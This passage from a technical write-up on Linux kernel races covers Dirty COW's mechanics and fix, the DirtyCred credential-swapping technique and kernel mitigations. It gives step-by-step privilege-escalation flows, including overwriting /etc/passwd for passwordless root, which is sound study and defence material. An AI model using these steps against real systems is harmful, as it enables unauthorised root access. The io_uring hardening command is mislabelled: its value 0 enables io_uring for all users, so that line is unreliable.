                      MAP_PRIVATE, target_fd, 0);

// Open /proc/self/mem for writing to our own address space
int proc_self_mem_fd = open("/proc/self/mem", O_RDWR);

// Race!
pthread_create(&t1, NULL, writer_thread, NULL);
pthread_create(&t2, NULL, madvise_thread, NULL);
```

**Why /proc/self/mem?**

Writing to `/proc/self/mem` is the mechanism to trigger `get_user_pages(FOLL_WRITE)` on the private mapping. Direct writes to a `MAP_PRIVATE` read-only mapping would generate `SIGSEGV`. But `/proc/self/mem` bypasses the VMA permission check and uses `get_user_pages()` directly.

An alternative approach uses `ptrace(PTRACE_POKEDATA)`, which also calls `get_user_pages(FOLL_WRITE)`.

### 8.5 Step-by-Step Race Execution

```
Time    Thread 1 (writer)                Thread 2 (madvise)
----    -----------------                ------------------
T0      write(/proc/self/mem) starts
T1      get_user_pages(FOLL_WRITE)
T2      follow_page: no page -> fault
T3      faultin_page -> do_wp_page
        COW copy created (private page)
T4      VM_FAULT_WRITE returned
        FOLL_WRITE dropped
T5      cond_resched() -- yields CPU     
T6                                       madvise(MADV_DONTNEED)
T7                                       Private COW page discarded!
T8                                       PTE cleared or reverted to
                                         file-backed page
T9      retry: follow_page (no FOLL_WRITE)
T10     Returns PAGE CACHE PAGE
        (original file page!)
T11     write() writes payload to
        PAGE CACHE PAGE
T12     PAGE CACHE IS DIRTY
        -> file on disk is modified!
```

### 8.6 The Fix

The fix introduced a new internal flag `FOLL_COW` to distinguish "we already did a COW" from "we need write access":

```c
// From the fix commit (19be0eaffa3ac7d8eb6784ad9bdbc7d67ed8e619):

// Instead of dropping FOLL_WRITE, we set FOLL_COW
if ((ret & VM_FAULT_WRITE) && !(vma->vm_flags & VM_WRITE))
    *flags |= FOLL_COW;

// In follow_page_pte, we check:
// If FOLL_COW is set, verify the page is still the COW copy
// by checking the pte dirty bit
if ((flags & FOLL_COW) && !pte_dirty(pte))
    return NULL;  // COW page was lost, retry the whole thing
```

This ensures that if `madvise(MADV_DONTNEED)` discards the COW copy, the subsequent `follow_page` call will detect that the page is no longer dirty (it's the clean file page) and refuse to return it, causing a full retry of the COW operation.

### 8.7 Impact and Real-World Usage

Dirty COW was used for:
- **Android rooting:** Widely used to root Android devices
- **Server compromise:** Found exploited in the wild on web servers
- **Container escape:** Could modify binaries on read-only bind mounts
- **VDSO overwrite:** By targeting the vDSO (virtual Dynamic Shared Object), an attacker could inject code into a shared read-only mapping used by all processes

---

## 9. DirtyCred Attack Technique

### 9.1 Overview

DirtyCred is a novel exploitation technique presented by Zhenpeng Lin, Yuhang Wu, and Xinyu Xing at USENIX Security 2022. Unlike traditional kernel exploitation that targets specific kernel data structures (e.g., `task_struct`, `cred`, `tty_struct`), DirtyCred operates by **swapping unprivileged credential objects with privileged ones** -- turning any kernel vulnerability that can free an in-use object into a privilege escalation, analogous to how Dirty COW swapped unprivileged file pages with privileged ones.

The key insight: kernel credentials (`struct cred`) and file credentials (`struct file`) are allocated from generic slab caches. A vulnerability that allows freeing such an object while it is still in use can be exploited by allocating a privileged credential in the freed slot.

### 9.2 Background: Linux Credential Model

**struct cred:**
```c
struct cred {
    atomic_t usage;
    kuid_t uid;      // Real UID
    kgid_t gid;      // Real GID
    kuid_t euid;     // Effective UID
    kgid_t egid;     // Effective GID
    // ... capabilities, keyrings, security labels ...
    struct rcu_head rcu;
};
```

Every task has a `struct cred` that determines its privileges. The `struct cred` is reference-counted and immutable once installed -- to change credentials, a new `struct cred` is allocated, modified, and committed via `commit_creds()`.

**struct file:**
```c
struct file {
    // ...
    const struct file_operations *f_op;
    atomic_long_t f_count;
    unsigned int f_flags;
    fmode_t f_mode;
    // ...
    const struct cred *f_cred;  // Credentials at time of open
    // ...
};
```

When a file is opened, the opener's credentials are captured in `file->f_cred`. Permission checks for subsequent operations use these captured credentials.

### 9.3 The DirtyCred Technique: Two Variants

#### Variant 1: Swapping `struct file` Objects

**Target:** Swap a `struct file` for a read-only file with a `struct file` for a writable privileged file (e.g., `/etc/passwd`).

**Mechanism:**

```
Step 1: Open a regular file -> gets struct file F1 in slab
Step 2: Trigger vulnerability to free F1 while it remains
        referenced by the fd table
Step 3: Quickly open /etc/passwd (or another privileged writable file)
        using a privileged process/context -> allocates struct file F2
        in the SAME slab slot as F1
Step 4: The original fd now points to F2 (privileged file)
Step 5: Write through the original fd -> writes to /etc/passwd!
```

#### Variant 2: Swapping `struct cred` Objects

**Target:** Swap the current task's `struct cred` with a privileged `struct cred` (e.g., root's).

**Mechanism:**

```
Step 1: Current task's credentials: cred_A (uid=1000, unprivileged)
Step 2: Trigger vulnerability to free cred_A while it is still
        the task's active credential
Step 3: Trigger a privileged operation that allocates a new struct cred
        (e.g., a setuid binary's credential setup)
        -> Allocates cred_B (uid=0) in the SAME slot as cred_A
Step 4: Current task's credential pointer now points to cred_B
Step 5: Task is now running as root!
```

### 9.4 Making the Swap Reliable

The critical challenge is ensuring that the replacement allocation lands in the same slot as the freed object. DirtyCred uses several techniques:

**a) Cross-cache compatibility:**
Both `struct cred` and `struct file` are allocated from specific slab caches (`cred_jar` and `filp` respectively). The freed object must be replaced with an object from the same cache.

**b) Heap massage (slab grooming):**

```
1. Exhaust the slab: allocate many objects of the same type to fill
   existing partial slabs and force new slab page allocations

2. Create a "victim slab" where the target object is alone or nearly
   alone on a slab page

3. Free the target object -- it becomes the only free slot on its slab

4. Immediately allocate the replacement object -- it will be allocated
   from the same slab, in the same slot
```

**c) Using userfaultfd/FUSE to control timing:**

The vulnerability is triggered in a context where the kernel accesses user memory. By placing this access on a userfaultfd-monitored page, the exploit can:

1. Trigger the vulnerability (free the object)
2. Kernel blocks on userfaultfd
3. Perform the replacement allocation
4. Resume the kernel (resolve the page fault)
5. Kernel continues, now using the swapped object

### 9.5 Detailed Exploitation Flow (struct file variant)

```
 Exploit Process                  Privileged Helper
 ---------------                  -----------------
 
 Phase 1: Heap Grooming
 - Open many files to fill filp slab pages
 - Close some to create controlled free slots
 - Open the target file to place it on a known slab
 
 Phase 2: Trigger Vulnerability
 - Call vulnerable syscall with buffer on userfaultfd page
 - Vulnerability frees the struct file for our target fd
 - Kernel blocks on userfaultfd page access

 Phase 3: Swap (while kernel is blocked)
                                  - Helper process (running as root or
                                    with elevated privileges) opens
                                    /etc/passwd with write permission
                                  - New struct file is allocated in the
                                    slot freed in Phase 2
 
 Phase 4: Resume
 - Resolve userfaultfd fault
 - Kernel resumes; our fd now references root's /etc/passwd struct file
 
 Phase 5: Profit
 - write(original_fd, "root::0:0:...\n") modifies /etc/passwd
 - su root (no password)
```

### 9.6 Advantages Over Traditional Exploitation

1. **Mitigation-agnostic:** DirtyCred doesn't require leaking KASLR, doesn't need to build arbitrary read/write primitives, and doesn't corrupt specific kernel structures that might be integrity-checked.

2. **Cross-version stability:** `struct cred` and `struct file` are fundamental kernel structures present in all kernel versions. Their layout changes infrequently.

3. **CFI-compatible:** No control flow hijacking is needed. The attack manipulates data, not code pointers.

4. **Works with many vulnerability classes:** Any vulnerability that can free an in-use `struct cred` or `struct file` can potentially be exploited via DirtyCred. This includes:
   - Use-after-free in file or credential handling
   - Double-free bugs
   - Out-of-bounds writes that can corrupt allocation metadata

### 9.7 Limitations and Caveats

1. **Slab isolation:** Modern kernels increasingly isolate security-sensitive objects in dedicated slab caches with `SLAB_ACCOUNT` or dedicated kmem caches, making cross-allocation harder.

2. **`CONFIG_SLAB_VIRTUAL`** and randomized slab allocation (in newer kernels) make heap layout prediction more difficult.

3. **Credential immutability checks:** The kernel verifies that a `struct cred` is not modified after being committed. DirtyCred replaces the entire object rather than modifying it, but some integrity checks may detect the swap.

4. **The "privileged allocation" problem:** For the `struct cred` variant, the replacement allocation must come from a privileged context. This typically requires a cooperating setuid binary or a specific kernel code path that allocates privileged credentials.

---

## 10. Mitigations and Defenses

### 10.1 Restricting userfaultfd

```bash
# Disable unprivileged userfaultfd
echo 0 > /proc/sys/vm/unprivileged_userfaultfd

# Or in sysctl.conf:
vm.unprivileged_userfaultfd = 0
```

The `UFFD_USER_MODE_ONLY` flag (Linux 5.11+) restricts userfaultfd to handling only userspace faults, preventing its use to pause kernel execution.

### 10.2 KCSAN (Kernel Concurrency Sanitizer)

KCSAN is a dynamic data race detector based on the LKMM (Linux Kernel Memory Model). It instruments memory accesses at compile time and detects concurrent accesses that lack proper synchronization.

```
CONFIG_KCSAN=y
CONFIG_KCSAN_REPORT_RACE_UNKNOWN_ORIGIN=y
```

KCSAN has identified thousands of data races in the kernel, many of which were previously unknown.

### 10.3 lockdep (Lock Dependency Validator)

Lockdep tracks lock acquisition order and detects potential deadlocks and lock ordering violations at runtime:

```
CONFIG_LOCKDEP=y
CONFIG_PROVE_LOCKING=y
CONFIG_LOCK_STAT=y
```

### 10.4 KASAN (Kernel Address Sanitizer)

While primarily a memory safety tool, KASAN detects use-after-free bugs that often result from race conditions:

```
CONFIG_KASAN=y
CONFIG_KASAN_GENERIC=y
```

### 10.5 Slab Hardening

- **`CONFIG_SLAB_FREELIST_RANDOM`:** Randomizes the freelist order in slab caches, making heap layout prediction harder
- **`CONFIG_SLAB_FREELIST_HARDENED`:** Adds integrity checks to freelist pointers
- **`CONFIG_RANDOM_KMALLOC_CACHES`:** Creates multiple copies of each slab cache and randomly assigns allocations, making cross-allocation attacks like DirtyCred significantly harder (merged in Linux 6.6)

### 10.6 io_uring Restrictions

Many distributions restrict unprivileged io_uring access:

```bash
# Disable unprivileged io_uring (Linux 5.12+)
echo 0 > /proc/sys/kernel/io_uring_disabled

# Values:
# 0 = enabled for all
# 1 = disabled for unprivileged
# 2 = disabled for all
```

### 10.7 SELinux/AppArmor FUSE Restrictions

Mandatory Access Control systems can restrict FUSE mount access:

```
# SELinux: deny fusermount for confined domains
# AppArmor: deny mount with fstype=fuse.*
```

### 10.8 Refcount Saturation (`refcount_t`)

The `refcount_t` type (replacing raw `atomic_t` for reference counts) saturates at `REFCOUNT_SATURATED` instead of wrapping, preventing reference count overflow/underflow races from being exploitable:

```c
// Old: atomic_t -- wraps around on overflow
atomic_dec_and_test(&obj->refcnt);  // Can underflow!

// New: refcount_t -- saturates, reports, and prevents exploitation
refcount_dec_and_test(&obj->refcnt);  // Saturates at 0, WARNS
```

---

## References

1. Linux kernel source: `mm/gup.c`, `mm/memory.c`, `mm/userfaultfd.c`
2. Kernel documentation: `Documentation/vm/userfaultfd.rst`
3. Kernel documentation: Lock types and rules - `Documentation/locking/locktypes.rst`
4. Kernel documentation: What is RCU? - `Documentation/RCU/whatisRCU.rst`
5. Kernel documentation: Sequence locks - `Documentation/locking/seqlock.rst`
6. Dirty COW (CVE-2016-5195): https://dirtycow.ninja/
7. Fix commit for Dirty COW: `19be0eaffa3ac7d8eb6784ad9bdbc7d67ed8e619`
8. Original (reverted) fix attempt: `4ceb5db9757a` (Linus Torvalds, 2005)
9. Lin, Wu, Xing. "DirtyCred: Escalating Privilege in Linux Kernel." USENIX Security 2022.
10. LWN: "Blocking userfaultfd() kernel-fault handling" - https://lwn.net/Articles/819834/
11. userfaultfd(2) man page: https://man7.org/linux/man-pages/man2/userfaultfd.2.html
12. Google Project Zero: Various kernel race condition analyses
13. Lizzie (blog.lizzie.io): "Using userfaultfd" - practical userfaultfd setup guide
14. KCSAN documentation: `Documentation/dev-tools/kcsan.rst`
15. Linux Kernel Memory Model: `tools/memory-model/`
